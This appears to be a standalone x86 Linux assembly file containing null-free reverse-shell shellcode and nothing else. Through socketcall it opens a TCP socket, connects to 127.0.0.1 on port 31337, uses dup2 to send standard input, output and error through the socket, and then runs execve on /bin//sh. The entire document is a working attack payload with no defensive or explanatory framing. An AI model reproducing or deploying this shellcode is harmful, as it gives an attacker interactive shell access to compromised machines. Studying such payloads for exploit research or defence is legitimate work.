.global your_asm_fn
.section .text

your_asm_fn:

//make socket
push $0x66
pop %eax

push $0x1
pop %ebx

xor %edi,%edi 

push %edi
push $0x1
push $0x2

mov %esp,%ecx

int $0x80

mov %eax,%esi

//connect socket
push $0x66
pop %eax

push $0x3
pop %ebx

xor %ecx,%ecx
add $0xffffffff,%ecx
xor $0xfeffffff,%ecx
add $0x7f,%ecx

push %ecx
pushw $0x697A
pushw $0x02
mov %esp,%ecx

push $0x10
push %ecx
push %esi

mov %esp,%ecx

int $0x80

//redirct std..
push $0x3f
pop %eax
mov %esi,%ebx
mov %edi,%ecx

int $0x80

push $0x3f
pop %eax
inc %ecx

int $0x80

push $0x3f
pop %eax
inc %ecx

int $0x80

push $0xb
pop %eax
push %edi
push $0x68732f2f
push $0x6e69622f
mov %esp,%ebx
push %edi
push %ebx
mov %esp,%ecx
mov %edi,%edx

int $0x80